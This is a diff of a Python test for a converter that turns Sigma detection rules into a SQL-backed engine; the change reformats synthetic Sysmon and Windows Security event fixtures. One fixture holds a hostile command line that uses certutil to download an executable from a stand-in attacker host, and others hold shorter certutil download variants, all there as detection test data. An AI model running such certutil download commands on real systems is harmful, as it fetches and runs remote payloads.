@@ -1,4 +1,5 @@
 """Sigma -> REMN converter: translation fidelity and end-to-end execution on the SQL engine."""
+
 from __future__ import annotations
 
 import json
@@ -166,12 +167,34 @@ def test_process_creation_rule_translates_and_runs(store):
 
     w = EventWriter(store, 1)
     sysmon = "Microsoft-Windows-Sysmon/Operational"
-    w.add(_ev(eventId=1, channel=sysmon, image=r"C:\Windows\System32\certutil.exe", commandLine="certutil -urlcache -split -f http://evil.example/a.exe a.exe",
-              parentImage=r"C:\Windows\System32\cmd.exe", data={"Image": r"C:\Windows\System32\certutil.exe"}))
-    w.add(_ev(eventId=1, channel=sysmon, image=r"C:\Windows\System32\certutil.exe", commandLine="certutil -urlcache -f http://x/y",
-              parentImage=r"C:\Windows\explorer.exe"))  # filtered: parent explorer
-    w.add(_ev(eventId=4688, channel="Security", processName=r"C:\Windows\System32\certutil.exe", commandLine="CERTUTIL -URLCACHE http://x",
-              parentProcessName=r"C:\Windows\System32\cmd.exe"))  # Security 4688 alias of Image
+    w.add(
+        _ev(
+            eventId=1,
+            channel=sysmon,
+            image=r"C:\Windows\System32\certutil.exe",
+            commandLine="certutil -urlcache -split -f http://evil.example/a.exe a.exe",
+            parentImage=r"C:\Windows\System32\cmd.exe",
+            data={"Image": r"C:\Windows\System32\certutil.exe"},
+        )
+    )
+    w.add(
+        _ev(
+            eventId=1,
+            channel=sysmon,
+            image=r"C:\Windows\System32\certutil.exe",
+            commandLine="certutil -urlcache -f http://x/y",
+            parentImage=r"C:\Windows\explorer.exe",
+        )
+    )  # filtered: parent explorer
+    w.add(
+        _ev(
+            eventId=4688,
+            channel="Security",
+            processName=r"C:\Windows\System32\certutil.exe",
+            commandLine="CERTUTIL -URLCACHE http://x",
+            parentProcessName=r"C:\Windows\System32\cmd.exe",
+        )
+    )  # Security 4688 alias of Image
     w.add(_ev(eventId=1, channel=sysmon, image=r"C:\Windows\notepad.exe", commandLine="notepad -urlcache http", parentImage=r"C:\a.exe"))
     w.add(_ev(eventId=7, channel=sysmon, image=r"C:\Windows\System32\certutil.exe", commandLine="certutil -urlcache http"))  # wrong event id
     w.flush()
